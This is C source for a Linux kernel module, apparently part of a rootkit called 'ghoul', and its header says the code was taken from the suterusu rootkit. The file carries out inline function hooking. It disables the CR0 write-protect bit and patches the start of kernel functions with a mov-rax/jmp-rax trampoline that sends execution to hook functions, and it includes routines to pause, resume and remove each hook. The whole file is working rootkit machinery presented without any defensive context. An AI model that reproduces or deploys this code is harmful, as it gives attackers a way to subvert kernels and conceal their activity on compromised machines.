/**
 * Inline hooking (splicing) implementation,
 * taken from the suterusu rootkit.
 * https://github.com/mncoppola/suterusu
 */

#include <linux/kconfig.h>
#include <linux/list.h>
#include <linux/slab.h>
#include "ghoul.h"

#if defined(CONFIG_X86_64)
#define HOOK_SIZE 12
#else
#error Only x86_64 is supported
#endif

struct inline_hook {
    void *addr;
    unsigned char orig_code[HOOK_SIZE];
    unsigned char new_code[HOOK_SIZE];
    struct list_head list;
};

LIST_HEAD(hooked_funcs);

#if defined(CONFIG_X86) || defined(CONFIG_X86_64)
__always_inline unsigned long disable_wp(void)
{
    unsigned long cr0, new_cr0;

    preempt_disable();
    barrier();

    cr0 = read_cr0();
    new_cr0 = cr0 & ~X86_CR0_WP;
    asm volatile("mov %0,%%cr0": "+r" (new_cr0) : : "memory");
    return cr0;
}

__always_inline void restore_wp(unsigned long cr0)
{
    write_cr0(cr0);

    barrier();
    preempt_enable();
}
#endif

notrace void inline_hook_register(void *original_function, void *hook_function)
{
    struct inline_hook *hook;

#if defined(CONFIG_X86) || defined(CONFIG_X86_64)
    unsigned long orig_cr0;
#endif

    hook = kzalloc(sizeof(struct inline_hook), GFP_KERNEL);
    if (hook == NULL) {
        error("ghoul: memory allocation error while registering inline hook\n");
        return;
    }

    hook->addr = original_function;
    memcpy(hook->orig_code, original_function, HOOK_SIZE);
    
#if defined(CONFIG_X86_64)
    // mov rax, $addr; jmp rax
    memcpy(hook->new_code, "\x48\xb8\x00\x00\x00\x00\x00\x00\x00\x00\xff\xe0", HOOK_SIZE);
    *(unsigned long *)&hook->new_code[2] = (unsigned long)hook_function;
#endif

#if defined(CONFIG_X86) || defined(CONFIG_X86_64)
    orig_cr0 = disable_wp();
    memcpy(original_function, hook->new_code, HOOK_SIZE);
    restore_wp(orig_cr0);
#endif

    list_add(&hook->list, &hooked_funcs);
}

notrace void inline_hook_pause(void *func)
{
    struct inline_hook *hook;

    list_for_each_entry (hook, &hooked_funcs, list) {
        if (hook->addr == func) {
#if defined(CONFIG_X86) || defined(CONFIG_X86_64)
            unsigned long orig_cr0 = disable_wp();
            memcpy(func, hook->orig_code, HOOK_SIZE);
            restore_wp(orig_cr0);
#endif
        }
    }
}

notrace void inline_hook_resume(void *func)
{
    struct inline_hook *hook;

    list_for_each_entry(hook, &hooked_funcs, list) {
        if (hook->addr == func)
        {
#if defined(CONFIG_X86) || defined(CONFIG_X86_64)
            unsigned long orig_cr0 = disable_wp();
            memcpy(func, hook->new_code, HOOK_SIZE);
            restore_wp(orig_cr0);
#endif
        }
    }
}

notrace void inline_hook_unregister(void *func)
{
    struct inline_hook *hook, *temp;

    list_for_each_entry_safe(hook, temp, &hooked_funcs, list) {
        if (hook->addr == func) {
#if defined(CONFIG_X86) || defined(CONFIG_X86_64)
            unsigned long orig_cr0 = disable_wp();
            memcpy(func, hook->orig_code, HOOK_SIZE);
            restore_wp(orig_cr0);
#endif
            list_del(&hook->list);
            kfree(hook);
            break;
        }
    }
}